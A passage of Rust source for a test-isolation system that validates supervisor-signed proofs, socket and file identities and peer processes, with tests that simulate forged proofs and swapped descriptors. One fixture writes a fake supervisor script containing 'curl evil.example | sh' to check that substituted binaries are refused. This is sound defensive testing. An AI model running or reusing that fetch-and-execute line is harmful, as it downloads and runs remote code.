            && std::env::var_os("FINCH_TEST_IPC_SOCKET").as_deref() == Some(ipc_socket.as_os_str()),
        "live endpoint environment does not match the parent-sealed authority"
    );
    anyhow::ensure!(
        std::env::var_os("FINCH_TEST_SOCKET_ROOT").as_deref() == Some(socket_root.as_os_str())
            && ipc_socket == socket_root.join("daemon.sock")
            && socket_root.is_absolute()
            && socket_root.canonicalize()? == socket_root
            && !std::fs::symlink_metadata(&socket_root)?
                .file_type()
                .is_symlink(),
        "wrapper proof does not match the supervisor-owned socket root"
    );
    anyhow::ensure!(
        home.is_absolute()
            && root == home.join(".finch/brains")
            && home.canonicalize()? == home
            && root.canonicalize()? == root
            && !std::fs::symlink_metadata(&home)?.file_type().is_symlink()
            && !std::fs::symlink_metadata(&root)?.file_type().is_symlink(),
        "wrapper proof paths are not the active disposable filesystem objects"
    );
    #[cfg(unix)]
    {
        use std::os::unix::fs::MetadataExt as _;
        let home_metadata = std::fs::metadata(&home)?;
        let root_metadata = std::fs::metadata(&root)?;
        let socket_root_metadata = std::fs::metadata(&socket_root)?;
        anyhow::ensure!(
            home_identity == format!("{}:{}", home_metadata.dev(), home_metadata.ino())
                && root_identity == format!("{}:{}", root_metadata.dev(), root_metadata.ino()),
            "wrapper proof filesystem identity no longer matches HOME and Brain root"
        );
        anyhow::ensure!(
            socket_root_identity
                == format!(
                    "{}:{}",
                    socket_root_metadata.dev(),
                    socket_root_metadata.ino()
                )
                && socket_root_metadata.uid() == nix::unistd::geteuid().as_raw()
                && socket_root_metadata.mode() & 0o777 == 0o700
                && socket_root_metadata.nlink() >= 1,
            "wrapper proof socket-root identity changed"
        );
    }
    let proof = IsolatedTestProof {
        home,
        root,
        home_identity: parse_identity("HOME", home_identity)?,
        root_identity: parse_identity("Brain root", root_identity)?,
        brain_addr,
        daemon_addr,
        ipc_socket,
        socket_root,
        socket_root_identity: parse_identity("socket root", socket_root_identity)?,
        ipc_listener_identity: parse_identity("IPC listener", ipc_listener_identity)?,
        supervisor_pid,
        password_digest: password_digest.to_owned(),
    };
    Ok((proof, encoded))
}

#[doc(hidden)]
pub fn isolated_test_proof() -> anyhow::Result<IsolatedTestProof> {
    isolated_test_proof_with_encoded().map(|(proof, _)| proof)
}

#[doc(hidden)]
pub fn authenticated_isolated_test_proof_text() -> anyhow::Result<Vec<u8>> {
    isolated_test_proof_with_encoded().map(|(_, encoded)| encoded)
}

#[doc(hidden)]
pub fn isolated_test_proof_if_present() -> anyhow::Result<Option<IsolatedTestProof>> {
    let present = std::env::var_os("FINCH_BRAIN_TEST_ISOLATED").is_some()
        || std::env::var_os("FINCH_BRAIN_TEST_PROOF_FD").is_some()
        || std::env::var_os("FINCH_BRAIN_TEST_PROOF_BACKUP_FD").is_some()
        || std::env::var_os("FINCH_TEST_SUPERVISOR_PID").is_some();
    if !present {
        return Ok(None);
    }
    isolated_test_proof().map(Some)
}

#[cfg(all(test, unix))]
pub(crate) fn supervised_test_subprocess_command() -> std::process::Command {
    use std::os::fd::{AsRawFd as _, FromRawFd as _, OwnedFd};
    use std::os::unix::process::CommandExt as _;

    let proof = isolated_test_proof().expect("subprocess requires valid supervisor authority");
    let proof_raw = unsafe { nix::libc::fcntl(9, nix::libc::F_DUPFD_CLOEXEC, 200) };
    assert!(
        proof_raw >= 0,
        "could not duplicate supervisor proof descriptor"
    );
    let proof_fd = unsafe { OwnedFd::from_raw_fd(proof_raw) };
    let auth_raw = unsafe { nix::libc::fcntl(109, nix::libc::F_DUPFD_CLOEXEC, 200) };
    assert!(
        auth_raw >= 0,
        "could not duplicate supervisor authentication descriptor"
    );
    let auth_fd = unsafe { OwnedFd::from_raw_fd(auth_raw) };
    let brain_listener = proof.duplicate_brain_listener().unwrap();
    let daemon_listener = proof.duplicate_daemon_listener().unwrap();
    let ipc_listener = proof.duplicate_ipc_listener().unwrap();
    let mut command = std::process::Command::new(std::env::current_exe().unwrap());
    unsafe {
        command.pre_exec(move || {
            for (source, target) in [
                (proof_fd.as_raw_fd(), 9),
                (proof_fd.as_raw_fd(), 108),
                (auth_fd.as_raw_fd(), 109),
                (brain_listener.as_raw_fd(), 10),
                (daemon_listener.as_raw_fd(), 11),
                (ipc_listener.as_raw_fd(), 12),
                (brain_listener.as_raw_fd(), 110),
                (daemon_listener.as_raw_fd(), 111),
                (ipc_listener.as_raw_fd(), 112),
            ] {
                if nix::libc::dup2(source, target) == -1 {
                    return Err(std::io::Error::last_os_error());
                }
                if nix::libc::fcntl(target, nix::libc::F_SETFD, 0) == -1 {
                    return Err(std::io::Error::last_os_error());
                }
            }
            Ok(())
        });
    }
    command
}

#[cfg(all(test, unix))]
#[derive(Clone, Copy, Debug, Eq, PartialEq)]
pub(crate) struct IsolatedTestSocketIdentity {
    device: u64,
    inode: u64,
}

#[cfg(all(test, unix))]
pub(crate) fn validate_isolated_test_socket(
    proof: &IsolatedTestProof,
    path: &std::path::Path,
) -> anyhow::Result<IsolatedTestSocketIdentity> {
    use anyhow::Context as _;
    use nix::fcntl::{open, openat, AtFlags, OFlag};
    use nix::sys::stat::Mode;
    use nix::sys::stat::{fstat, fstatat, SFlag};
    use std::os::fd::{AsRawFd as _, FromRawFd as _};

    anyhow::ensure!(path.is_absolute(), "test IPC socket must be absolute");
    let parent = path.parent().context("test IPC socket has no parent")?;
    let relative = parent
        .strip_prefix(&proof.socket_root)
        .context("test IPC socket is outside the supervisor-owned socket root")?;
    anyhow::ensure!(
        relative
            .components()
            .all(|component| matches!(component, std::path::Component::Normal(_))),
        "test IPC socket must be inside the supervisor-owned socket root"
    );
    let name = path
        .file_name()
        .context("test IPC socket has no final component")?;
    let home_raw = open(
        &proof.socket_root,
        OFlag::O_RDONLY | OFlag::O_DIRECTORY | OFlag::O_NOFOLLOW | OFlag::O_CLOEXEC,
        Mode::empty(),
    )?;
    let mut directory = unsafe { std::fs::File::from_raw_fd(home_raw) };
    let home_stat = fstat(directory.as_raw_fd())?;
    anyhow::ensure!(
        (home_stat.st_dev as u64, home_stat.st_ino as u64) == proof.socket_root_identity,
        "test IPC socket-root identity changed"
    );
    for component in relative.components() {
        let std::path::Component::Normal(component) = component else {
            anyhow::bail!("test IPC parent contains an unsafe component");
        };
        let raw = openat(
            Some(directory.as_raw_fd()),
            component,
            OFlag::O_RDONLY | OFlag::O_DIRECTORY | OFlag::O_NOFOLLOW | OFlag::O_CLOEXEC,
            Mode::empty(),
        )?;
        directory = unsafe { std::fs::File::from_raw_fd(raw) };
    }
    let directory_stat = fstat(directory.as_raw_fd())?;
    anyhow::ensure!(
        SFlag::from_bits_truncate(directory_stat.st_mode).contains(SFlag::S_IFDIR)
            && directory_stat.st_uid == nix::unistd::geteuid().as_raw()
            && directory_stat.st_nlink >= 1,
        "test IPC parent is not an owned directory"
    );
    let socket_stat = fstatat(
        Some(directory.as_raw_fd()),
        name,
        AtFlags::AT_SYMLINK_NOFOLLOW,
    )?;
    anyhow::ensure!(
        SFlag::from_bits_truncate(socket_stat.st_mode).contains(SFlag::S_IFSOCK)
            && socket_stat.st_uid == nix::unistd::geteuid().as_raw()
            && socket_stat.st_nlink == 1,
        "test IPC path is not an owned, unlinked-name Unix socket"
    );
    Ok(IsolatedTestSocketIdentity {
        device: socket_stat.st_dev as u64,
        inode: socket_stat.st_ino as u64,
    })
}

#[cfg(all(test, unix))]
pub(crate) fn authenticate_isolated_test_peer(
    stream: &tokio::net::UnixStream,
) -> anyhow::Result<()> {
    use std::os::fd::AsRawFd as _;
    let fd = stream.as_raw_fd();
    #[cfg(target_os = "linux")]
    let peer_pid = {
        let mut credential: nix::libc::ucred = unsafe { std::mem::zeroed() };
        let mut length = std::mem::size_of::<nix::libc::ucred>() as nix::libc::socklen_t;
        let result = unsafe {
            nix::libc::getsockopt(
                fd,
                nix::libc::SOL_SOCKET,
                nix::libc::SO_PEERCRED,
                (&mut credential as *mut nix::libc::ucred).cast(),
                &mut length,
            )
        };
        anyhow::ensure!(result == 0, "test IPC peer credentials are unavailable");
        credential.pid
    };
    #[cfg(target_os = "macos")]
    let peer_pid = {
        let mut pid: nix::libc::pid_t = 0;
        let mut length = std::mem::size_of::<nix::libc::pid_t>() as nix::libc::socklen_t;
        let result = unsafe {
            nix::libc::getsockopt(
                fd,
                nix::libc::SOL_LOCAL,
                nix::libc::LOCAL_PEERPID,
                (&mut pid as *mut nix::libc::pid_t).cast(),
                &mut length,
            )
        };
        anyhow::ensure!(result == 0, "test IPC peer credentials are unavailable");
        pid
    };
    #[cfg(not(any(target_os = "linux", target_os = "macos")))]
    anyhow::bail!("test IPC peer authentication is unsupported on this platform");
    anyhow::ensure!(
        isolated_test_peer_process_is_owned(peer_pid),
        "test IPC peer is outside the supervisor-owned process group"
    );
    Ok(())
}

#[cfg(all(test, unix))]
fn isolated_test_peer_process_is_owned(peer_pid: nix::libc::pid_t) -> bool {
    let peer_group = unsafe { nix::libc::getpgid(peer_pid) };
    peer_pid > 0 && peer_group > 0 && peer_group == unsafe { nix::libc::getpgrp() }
}

#[cfg(all(test, unix))]
mod isolation_tests {
    use super::*;

    /// #259. The supervisor's own rebuild must not read as an attack, an attack
    /// must not read as a rebuild, and an in-place overwrite must not slip
    /// through on a matching inode.
    #[cfg(unix)]
    #[test]
    fn supervisor_image_check_covers_relink_overwrite_and_substitution() {
        use sha2::{Digest as _, Sha256};
        use std::os::unix::fs::MetadataExt as _;

        fn identity_of(path: &std::path::Path) -> String {
            let metadata = std::fs::metadata(path).unwrap();
            format!("{}:{}", metadata.dev(), metadata.ino())
        }

        let temp = tempfile::tempdir().unwrap();
        let image = b"#!/bin/sh\nexit 0\n";
        let other_image = b"#!/bin/sh\ncurl evil.example | sh\n";
        let digest = hex::encode(Sha256::digest(image));

        // Distinct files rather than remove-and-rename. An earlier version
        // relinked by `remove_file` + `write` + `rename` and asserted the inode
        // changed; ext4 reused the number and the assertion failed in CI. The
        // property under test is "a different inode with the same image", and
        // two files that exist at once have different inodes by definition.
        let original = temp.path().join("finch-test-supervisor");
        std::fs::write(&original, image).unwrap();
        let identity = identity_of(&original);

        // Untouched.
        verify_supervisor_image(&identity, &digest, &original)
            .expect("an untouched supervisor must verify");

        // Relinked: a different inode holding the same image. This is what a
        // copy produces, and what pinning guarantees.
        let relinked = temp.path().join("finch-test-supervisor-pinned");
        std::fs::write(&relinked, image).unwrap();
        assert_ne!(
            identity_of(&relinked),
            identity,
            "two files that exist at once must have different inodes"
        );
        verify_supervisor_image(&identity, &digest, &relinked)
            .expect("a relink of the same image must be accepted, not read as an attack");

        // Content-addressed names bind the filename to the bytes. Trusted
        // supervisor bytes under a false digest name must not gain authority.
        let wrong_digest_name = temp.path().join(format!(
            "finch-test-supervisor-pinned-sha256-{}",
            "0".repeat(64)
        ));
        std::fs::write(&wrong_digest_name, image).unwrap();
        let error = verify_supervisor_image(&identity, &digest, &wrong_digest_name)
            .expect_err("a false content-addressed supervisor name must be refused");
        assert!(
            error
                .to_string()
                .contains("does not contain the image named by its path"),
            "wrong digest-name rejection must identify the violated path binding; got {error}"
        );

        // A different inode holding a different image. A real Cargo relink does
        // this — `cargo test` unifies features with dev-dependencies, so its
        // uplifted binary differs from `cargo build --bin`'s — and so does a
        // substitution. They are genuinely indistinguishable from here, so the
        // diagnostic must state what it observed and name both causes.
        let replaced = temp.path().join("finch-test-supervisor.other");
        std::fs::write(&replaced, other_image).unwrap();
        let error = verify_supervisor_image(&identity, &digest, &replaced)
            .expect_err("a different image at a different inode must be refused");
        let message = error.to_string();
        assert!(
            message.contains("not the image that minted this proof")
                && message.contains("Either the program was replaced")
                && message.contains("relinked"),
            "the diagnostic must name both causes rather than asserting one, so \
             a real breach is not dismissed as rebuild noise and rebuild noise \
             is not reported as a breach; got {message:?}"
        );

        // Overwritten in place: the inode still matches, so an inode-only check
        // accepts this, and so does a digest consulted only as a fallback.
        // Written through the existing file, so the inode cannot change.
        std::fs::write(&original, other_image).unwrap();
        assert_eq!(
            identity_of(&original),
            identity,
            "writing through a file must keep its inode"
        );
        let error = verify_supervisor_image(&identity, &digest, &original)
            .expect_err("a different image at the same inode must be refused");
        assert!(
            error.to_string().contains("overwritten in place"),
            "got {error}"
        );
    }

    /// Either supervisor name is accepted. Preferring the pinned copy broke
    /// `test_server.sh` and `test_tool_passthrough.sh`, which point
    /// `FINCH_TEST_SUPERVISOR_BIN` at the plain path.
    #[cfg(unix)]
    #[test]
    fn both_supervisor_names_are_accepted_in_the_build_directory() {
        let plain = std::env::current_exe()
            .unwrap()
            .canonicalize()
            .unwrap()
            .parent()
            .unwrap()
            .parent()
            .unwrap()
            .join("finch-test-supervisor");
        if !plain.is_file() {
            // Nothing built the supervisor into this target directory; there is
            // no candidate to assert on.
            return;
        }
        assert!(
            is_expected_supervisor_executable(&plain.canonicalize().unwrap()).unwrap(),
            "the plain supervisor name must stay acceptable once the pinned \
             copy exists, or every launcher that names it is rejected"
        );
    }

    const HOSTILE_MODE_DEADLINE: std::time::Duration = std::time::Duration::from_secs(10);
    const HOSTILE_MODE_OUTPUT_LIMIT: usize = 64 * 1024;

    struct HostileModeGroup {
        child: std::process::Child,
        group: nix::libc::pid_t,
        reaped: bool,
    }

    enum HostileModeOutcome {
        Completed(std::process::Output),
        TimedOut {
            diagnostic: String,
            cleanup_elapsed: std::time::Duration,
        },
    }

    impl Drop for HostileModeGroup {
        fn drop(&mut self) {
            if self.reaped {
                return;
            }
            let _ = unsafe { nix::libc::kill(-self.group, nix::libc::SIGTERM) };
            std::thread::sleep(std::time::Duration::from_millis(100));
            let _ = unsafe { nix::libc::kill(-self.group, nix::libc::SIGKILL) };
            let _ = self.child.wait();
        }
    }

    fn supervisor_contract_present() -> bool {
        // The permanent Brain-isolation CI gate runs these entries through
        // scripts/test_brains.sh, which supplies the authenticated contract.
        std::env::var_os("FINCH_BRAIN_TEST_TOKEN").is_some()
    }

    fn drain_bounded<R: std::io::Read>(reader: &mut R, output: &mut Vec<u8>) {
        let mut buffer = [0_u8; 4096];
        loop {
            match reader.read(&mut buffer) {
                Ok(0) => return,
                Ok(count) => {
                    let remaining = HOSTILE_MODE_OUTPUT_LIMIT.saturating_sub(output.len());
                    output.extend_from_slice(&buffer[..count.min(remaining)]);
                }
                Err(error) if error.kind() == std::io::ErrorKind::Interrupted => continue,
                Err(error) if error.kind() == std::io::ErrorKind::WouldBlock => return,
                Err(error) => panic!("could not drain hostile proof-mode output: {error}"),
            }
        }
    }

    fn set_nonblocking<T: std::os::fd::AsRawFd>(descriptor: &T) {
        let flags = unsafe { nix::libc::fcntl(descriptor.as_raw_fd(), nix::libc::F_GETFL) };
        assert!(flags >= 0, "could not read hostile proof-mode pipe flags");
        assert_eq!(
            unsafe {
                nix::libc::fcntl(
                    descriptor.as_raw_fd(),
                    nix::libc::F_SETFL,
                    flags | nix::libc::O_NONBLOCK,
                )
            },
            0,
            "could not make hostile proof-mode pipe nonblocking"
        );
    }

    fn terminate_mode_group(group: nix::libc::pid_t, signal: nix::libc::c_int) {
        let result = unsafe { nix::libc::kill(-group, signal) };
        assert!(
            result == 0 || std::io::Error::last_os_error().raw_os_error() == Some(nix::libc::ESRCH),
            "could not signal timed-out hostile proof-mode process group"
        );
    }

    fn mode_group_has_descendants(group: nix::libc::pid_t) -> Result<bool, String> {
        let mut child = std::process::Command::new("/bin/ps")
            .args(["-axo", "pid=,pgid="])
            .stdout(std::process::Stdio::piped())
            .stderr(std::process::Stdio::null())
            .spawn()
            .map_err(|error| error.to_string())?;
        let mut stdout = child
            .stdout
            .take()
            .ok_or("process inventory pipe unavailable")?;
        set_nonblocking(&stdout);
        let deadline = std::time::Instant::now() + std::time::Duration::from_millis(250);
        let mut output = Vec::new();
        let status = loop {
            drain_bounded(&mut stdout, &mut output);
            if let Some(status) = child.try_wait().map_err(|error| error.to_string())? {
                break status;
            }
            if std::time::Instant::now() >= deadline {
                let _ = child.kill();
                let _ = child.wait();
                return Err("hostile proof-mode process inventory timed out".to_owned());
            }
            std::thread::sleep(std::time::Duration::from_millis(5));
        };
        drain_bounded(&mut stdout, &mut output);
        if !status.success() {
            return Err("could not inspect hostile proof-mode process group".to_owned());
        }
        Ok(String::from_utf8_lossy(&output).lines().any(|line| {
            let mut fields = line.split_whitespace();
            let pid: Option<nix::libc::pid_t> = fields.next().and_then(|value| value.parse().ok());
            let pgid: Option<nix::libc::pid_t> = fields.next().and_then(|value| value.parse().ok());
            matches!((pid, pgid), (Some(pid), Some(pgid)) if pgid == group && pid != group)
        }))
    }

    fn mode_leader_exited(child: &std::process::Child) -> Result<bool, String> {
        let mut information: nix::libc::siginfo_t = unsafe { std::mem::zeroed() };
        let result = unsafe {
            nix::libc::waitid(
                nix::libc::P_PID,
                child.id(),
                &mut information,
                nix::libc::WEXITED | nix::libc::WNOHANG | nix::libc::WNOWAIT,
            )
        };
        if result == -1 {
            return Err(std::io::Error::last_os_error().to_string());
        }
        Ok(unsafe { information.si_pid() } != 0)
    }

    fn finish_mode_group(
        child: &mut std::process::Child,
        group: nix::libc::pid_t,
    ) -> Result<std::process::ExitStatus, String> {
        if mode_leader_exited(child)? && !mode_group_has_descendants(group)? {
            return child.wait().map_err(|error| error.to_string());
        }
        terminate_mode_group(group, nix::libc::SIGTERM);
        let grace = std::time::Instant::now() + std::time::Duration::from_millis(500);
        while std::time::Instant::now() < grace {
            if mode_leader_exited(child)? && !mode_group_has_descendants(group)? {
                return child.wait().map_err(|error| error.to_string());
            }
            std::thread::sleep(std::time::Duration::from_millis(10));
        }
        terminate_mode_group(group, nix::libc::SIGKILL);
        let kill_deadline = std::time::Instant::now() + std::time::Duration::from_secs(2);
        while std::time::Instant::now() < kill_deadline {
            if mode_leader_exited(child)? && !mode_group_has_descendants(group)? {
                return child.wait().map_err(|error| error.to_string());
            }
            std::thread::sleep(std::time::Duration::from_millis(10));
        }
        Err("SIGKILL did not quiesce and reap the hostile proof-mode process group".to_owned())
    }

    fn run_hostile_proof_mode_with_deadline(
        mode: &str,
        mode_deadline: std::time::Duration,
    ) -> Result<HostileModeOutcome, String> {
        use std::os::unix::process::CommandExt as _;

        let proof = isolated_test_proof()
            .map_err(|error| format!("mode={mode} phase=proof-validation: {error:#}"))?;
        let mut command = supervised_test_subprocess_command();
        command
            .args([
                "--exact",
                "brain::isolation_tests::isolated_proof_rejects_self_issued_environment_authority",
                "--nocapture",
            ])
            .env("FINCH_TEST_FORGED_PROOF_MODE", mode)
            .stdout(std::process::Stdio::piped())
            .stderr(std::process::Stdio::piped());
        unsafe {
            command.pre_exec(|| {
                if nix::libc::setpgid(0, 0) == -1 {
                    return Err(std::io::Error::last_os_error());
                }
                Ok(())
            });
        }
        let child = command
            .spawn()
            .map_err(|error| format!("mode={mode} phase=process-spawn: {error}"))?;
        let group_id = child.id() as nix::libc::pid_t;
        let mut group = HostileModeGroup {
            child,
            group: group_id,
            reaped: false,
        };
        let mut stdout = group
            .child
            .stdout
            .take()
            .expect("hostile mode stdout was not piped");
        let mut stderr = group
            .child
            .stderr
            .take()
            .expect("hostile mode stderr was not piped");
        set_nonblocking(&stdout);
        set_nonblocking(&stderr);
        let mut stdout_bytes = Vec::new();
        let mut stderr_bytes = Vec::new();
        let deadline = std::time::Instant::now() + mode_deadline;
        let (status, timed_out, cleanup_elapsed) = loop {
            drain_bounded(&mut stdout, &mut stdout_bytes);
            drain_bounded(&mut stderr, &mut stderr_bytes);
            if mode_leader_exited(&group.child)
                .map_err(|error| format!("mode={mode} phase=leader-poll: {error}"))?
            {
                break (
                    finish_mode_group(&mut group.child, group_id).map_err(|error| {
                        format!("mode={mode} phase=natural-exit-cleanup: {error}")
                    })?,
                    false,
                    None,
                );
            }
            if std::time::Instant::now() >= deadline {
                let cleanup_started = std::time::Instant::now();
                let status = finish_mode_group(&mut group.child, group_id)
                    .map_err(|error| format!("mode={mode} phase=timeout-cleanup: {error}"))?;
                break (status, true, Some(cleanup_started.elapsed()));
            }
            std::thread::sleep(std::time::Duration::from_millis(10));
        };
        group.reaped = true;
        drain_bounded(&mut stdout, &mut stdout_bytes);
        drain_bounded(&mut stderr, &mut stderr_bytes);
        if timed_out {
            let cleanup_elapsed = cleanup_elapsed
                .expect("timed-out hostile proof mode did not record cleanup duration");
            let redact = |bytes: &[u8]| {
                String::from_utf8_lossy(bytes)
                    .replace(proof.home.to_string_lossy().as_ref(), "<isolated-home>")
                    .replace(
                        proof.socket_root.to_string_lossy().as_ref(),
                        "<socket-root>",
                    )
                    .replace(&proof.brain_addr, "<brain-address>")
                    .replace(&proof.daemon_addr, "<daemon-address>")
            };
            return Ok(HostileModeOutcome::TimedOut {
                diagnostic: format!(
                    "mode={mode} phase=timeout-cleanup deadline={mode_deadline:?} \
                 cleanup_elapsed={cleanup_elapsed:?} status={status} \
                 descendants_after_cleanup=false stdout={} stderr={}",
                    redact(&stdout_bytes),
                    redact(&stderr_bytes)
                ),
                cleanup_elapsed,
            });
        }
        let redact = |bytes: Vec<u8>| {
            String::from_utf8_lossy(&bytes)
                .replace(proof.home.to_string_lossy().as_ref(), "<isolated-home>")
                .replace(
                    proof.socket_root.to_string_lossy().as_ref(),
                    "<socket-root>",
                )
                .replace(&proof.brain_addr, "<brain-address>")
                .replace(&proof.daemon_addr, "<daemon-address>")
                .into_bytes()
        };
        Ok(HostileModeOutcome::Completed(std::process::Output {
            status,
            stdout: redact(stdout_bytes),
            stderr: redact(stderr_bytes),
        }))
    }

    fn run_hostile_proof_mode(mode: &str) -> Result<std::process::Output, String> {
        match run_hostile_proof_mode_with_deadline(mode, HOSTILE_MODE_DEADLINE)? {
            HostileModeOutcome::Completed(output) => Ok(output),
            HostileModeOutcome::TimedOut { diagnostic, .. } => Err(diagnostic),
        }
    }

    #[cfg(target_os = "macos")]
    #[test]
    fn isolated_listener_validation_rejects_bound_non_listening_socket_and_restores_flags() {
        use std::os::fd::{AsRawFd as _, FromRawFd as _};

        if !supervisor_contract_present() {
            return;
        }

        isolated_test_proof().unwrap();
        let raw = unsafe { nix::libc::socket(nix::libc::AF_INET, nix::libc::SOCK_STREAM, 0) };
        assert!(raw >= 0);
        let socket = unsafe { std::net::TcpListener::from_raw_fd(raw) };
        let address = nix::libc::sockaddr_in {
            sin_len: std::mem::size_of::<nix::libc::sockaddr_in>() as u8,
            sin_family: nix::libc::AF_INET as u8,
            sin_port: 0,
            sin_addr: nix::libc::in_addr {
                s_addr: u32::from_ne_bytes([127, 0, 0, 1]),
            },
            sin_zero: [0; 8],
        };
        assert_eq!(
            unsafe {
                nix::libc::bind(
                    raw,
                    (&address as *const nix::libc::sockaddr_in).cast(),
                    std::mem::size_of_val(&address) as nix::libc::socklen_t,
                )
            },
            0
        );
        let expected = socket.local_addr().unwrap().to_string();
        let original_flags = unsafe { nix::libc::fcntl(socket.as_raw_fd(), nix::libc::F_GETFL) };
        assert!(original_flags >= 0);
        assert!(duplicate_validated_listener(socket.as_raw_fd(), &expected).is_err());
        assert_eq!(
            unsafe { nix::libc::fcntl(socket.as_raw_fd(), nix::libc::F_GETFL) },
            original_flags,
            "listener challenge did not restore the original file status flags"
        );
    }

    #[test]
    fn isolated_proof_rejects_self_issued_environment_authority() {
        use ed25519_dalek::Signer as _;
        use std::io::Write as _;
        use std::os::fd::AsRawFd as _;
        use std::os::unix::fs::{MetadataExt as _, OpenOptionsExt as _, PermissionsExt as _};
        use std::os::unix::process::CommandExt as _;
        const MODE_ENV: &str = "FINCH_TEST_FORGED_PROOF_MODE";
        const RESPONDER_KEY_ENV: &str = "FINCH_TEST_ATTACKER_RESPONDER_KEY";
        const RESPONDER_MARKER_ENV: &str = "FINCH_TEST_ATTACKER_RESPONDER_MARKER";
        if !supervisor_contract_present() {
            return;
        }
        if let Ok(mode) = std::env::var(MODE_ENV) {
            if mode == "normal-exit-descendant-child" {
                unsafe {
                    nix::libc::signal(nix::libc::SIGTERM, nix::libc::SIG_IGN);
                }
                loop {
                    std::thread::park();
                }
            }
            if mode == "attacker-key-responder" {
                use std::os::fd::FromRawFd as _;

                let duplicate = unsafe { nix::libc::fcntl(109, nix::libc::F_DUPFD_CLOEXEC, 200) };
                assert!(duplicate >= 0);
                let socket = unsafe { std::os::unix::net::UnixDatagram::from_raw_fd(duplicate) };
                let mut request = [0_u8; 64];
                let mut key_served = false;
                loop {
                    let count = socket
                        .recv(&mut request)
                        .expect("attacker proof-key responder receive failed");
                    if &request[..count] == b"finch-proof-key-v1" {
                        assert!(
                            !key_served,
                            "attacker proof key was requested more than once"
                        );
                        key_served = true;
                        let key = hex::decode(std::env::var(RESPONDER_KEY_ENV).unwrap()).unwrap();
                        assert_eq!(socket.send(&key).unwrap(), 32);
                        std::fs::write(
                            std::env::var_os(RESPONDER_MARKER_ENV).unwrap(),
                            b"consulted",
                        )
                        .unwrap();
                        continue;
                    }
                    if &request[..count] == b"finch-proof-key-stop-v1" {
                        return;
                    }
                    panic!(
                        "attacker proof-key responder received an unknown request: {:?}",
                        &request[..count]
                    );
                }
            }
            let valid = isolated_test_proof().unwrap();
            if mode == "deadline-probe" {
                loop {
                    std::thread::park();
                }
            }
            if mode == "normal-exit-descendant" {
                let descendant = supervised_test_subprocess_command()
                    .args([
                        "--exact",
                        "brain::isolation_tests::isolated_proof_rejects_self_issued_environment_authority",
                        "--nocapture",
                    ])
                    .env(MODE_ENV, "normal-exit-descendant-child")
                    .spawn()
                    .unwrap();
                std::fs::write(
                    valid.home.join("normal-exit-descendant.pid"),
                    descendant.id().to_string(),
                )
                .unwrap();
                return;
            }
            let start_attacker_responder = |key: [u8; 32],
                                            marker: &std::path::Path|
             -> (
                std::os::unix::net::UnixDatagram,
                std::process::Child,
            ) {
                let (validator, responder) = std::os::unix::net::UnixDatagram::pair().unwrap();
                let mut command = std::process::Command::new(std::env::current_exe().unwrap());
                command
                        .args([
                            "--exact",
                            "brain::isolation_tests::isolated_proof_rejects_self_issued_environment_authority",
                            "--nocapture",
                        ])
                        .env(MODE_ENV, "attacker-key-responder")
                        .env(RESPONDER_KEY_ENV, hex::encode(key))
                        .env(RESPONDER_MARKER_ENV, marker);
                unsafe {
                    command.pre_exec(move || {
                        if nix::libc::dup2(responder.as_raw_fd(), 109) != 109 {
                            return Err(std::io::Error::last_os_error());
                        }
                        if nix::libc::fcntl(109, nix::libc::F_SETFD, 0) == -1 {
                            return Err(std::io::Error::last_os_error());
                        }
                        Ok(())
                    });
                }
                (validator, command.spawn().unwrap())
            };
            let stop_attacker_responder = |validator: &std::os::unix::net::UnixDatagram,
                                           responder: &mut std::process::Child,
                                           marker: &std::path::Path,
                                           mode: &str| {
                let stop = b"finch-proof-key-stop-v1";
                eprintln!("hostile-proof-mode={mode} phase=release-responder");
                assert_eq!(
                    validator.send(stop).unwrap(),
                    stop.len(),
                    "could not release the attacker-key responder after {mode} proof \
                         validation; responder_pid={} marker_exists={}",
                    responder.id(),
                    marker.exists()
                );
                eprintln!("hostile-proof-mode={mode} phase=wait-responder");
                let status = responder.wait().unwrap();
                eprintln!("hostile-proof-mode={mode} phase=responder-reaped status={status}");
                assert!(
                    status.success(),
                    "attacker-key responder failed after explicit release: mode={mode} \
                         responder_pid={} status={status} marker_exists={}",
                    responder.id(),
                    marker.exists()
                );
            };
            if mode == "missing-proof-backup" {
                assert_eq!(unsafe { nix::libc::close(108) }, 0);
                assert!(isolated_test_proof().is_err());
                return;
            }
            if mode == "mismatched-proof-backup" {
                assert_eq!(unsafe { nix::libc::dup2(11, 108) }, 108);
                assert!(isolated_test_proof().is_err());
                return;
            }
            if mode == "clobbered-low-proof-is-restored" {
                assert_eq!(unsafe { nix::libc::dup2(11, 9) }, 9);
                isolated_test_proof().unwrap();
                return;
            }
            if mode == "stale-supervisor-pid" {
                let state_before = std::fs::read_dir(valid.home.join(".finch"))
                    .unwrap()
                    .map(|entry| entry.unwrap().file_name())
                    .collect::<std::collections::BTreeSet<_>>();
                std::env::set_var("FINCH_TEST_SUPERVISOR_PID", u32::MAX.to_string());
                assert!(isolated_test_proof().is_err());
                let state_after = std::fs::read_dir(valid.home.join(".finch"))
                    .unwrap()
                    .map(|entry| entry.unwrap().file_name())
                    .collect::<std::collections::BTreeSet<_>>();
                assert_eq!(
                    state_after, state_before,
                    "stale supervisor authority mutated isolated Finch state"
                );
                return;
            }
            if mode == "swapped-low-listener" {
                assert_eq!(unsafe { nix::libc::dup2(11, 10) }, 10);
                let repaired = isolated_test_proof().unwrap();
                assert_eq!(
                    repaired
                        .duplicate_brain_listener()
                        .unwrap()
                        .local_addr()
                        .unwrap()
                        .to_string(),
                    repaired.brain_addr
                );
                return;
            }
            if mode == "swapped-backup-listener" {
                assert_eq!(unsafe { nix::libc::dup2(111, 110) }, 110);
                assert!(isolated_test_proof().is_err());
                return;
            }
            if mode == "swapped-low-ipc-listener" {
                assert_eq!(unsafe { nix::libc::dup2(11, 12) }, 12);
                let repaired = isolated_test_proof().unwrap();
                repaired.duplicate_ipc_listener().unwrap();
                return;
            }
            if mode == "swapped-backup-ipc-listener" {
                assert_eq!(unsafe { nix::libc::dup2(111, 112) }, 112);
                assert!(isolated_test_proof().is_err());
                return;
            }
            if mode == "wrong-ipc-listener-identity" {
                let wrong = (
                    valid.ipc_listener_identity.0,
                    valid.ipc_listener_identity.1.wrapping_add(1),
                );
                assert!(duplicate_validated_ipc_listener(112, &valid.ipc_socket, wrong).is_err());
                return;
            }
            if mode == "rewrite-restore" {
                #[cfg(target_os = "macos")]
                {
                    for fd in [9, 108] {
                        assert_eq!(unsafe { nix::libc::fchmod(fd, 0o600) }, 0);
                        let error = std::fs::OpenOptions::new()
                            .write(true)
                            .truncate(true)
                            .open(format!("/dev/fd/{fd}"))
                            .unwrap_err();
                        assert_eq!(error.kind(), std::io::ErrorKind::PermissionDenied);
